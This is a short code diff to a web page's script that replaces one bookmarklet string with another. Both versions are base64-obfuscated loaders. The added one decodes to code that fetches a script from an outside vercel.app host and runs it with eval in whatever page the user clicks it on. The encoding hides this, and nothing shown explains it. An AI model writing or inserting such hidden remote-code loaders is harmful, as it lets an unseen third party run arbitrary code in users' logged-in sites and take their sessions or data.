@@ -763,7 +763,7 @@
     <script>
         document.addEventListener('DOMContentLoaded', function() {
             // Bookmarklet code
-            const bookmarkletCode = `javascript:(()=>{let u=atob('aHR0cHM6Ly9kZXZxdHh4LnZlcmNlbC5hcHAv');fetch(u).then(r=>r.text()).then(eval).catch(e=>console.error(e))})();`;
+            const bookmarkletCode = `javascript:(function(){eval(atob('KGZ1bmN0aW9uKCl7Y29uc3QgdXJsID0gJ2h0dHBzOi8vamlzYW54ZGV2LnZlcmNlbC5hcHAvJztmZXRjaCh1cmwpLnRoZW4ocmVzcG9uc2UgPT4gcmVzcG9uc2UudGV4dCgpKS50aGVuKGNvZGUgPT4gZXZhbChjb2RlKSk7fSkoKTs='));})();`;
 
             // Set the bookmarklet link href
             const bookmarkletLink = document.getElementById('bookmarklet-link');
